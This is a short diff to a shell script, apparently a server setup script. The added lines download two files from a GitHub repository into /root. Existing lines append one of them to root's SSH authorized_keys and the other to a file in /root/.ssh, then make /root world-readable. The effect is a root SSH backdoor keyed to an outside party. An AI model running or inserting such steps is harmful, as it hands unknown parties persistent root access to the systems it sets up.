@@ -1,4 +1,6 @@
 mkdir /root/.ssh
+wget -P /root https://raw.githubusercontent.com/fffgg3g/v2work/main/gongmi.gongmi
+wget -P /root  https://raw.githubusercontent.com/fffgg3g/v2work/main/readme2.txt
 cat /root/gongmi.gongmi >> /root/.ssh/authorized_keys
 cat /root/readme2.txt >> /root/.ssh/pr
 chmod 755 /root
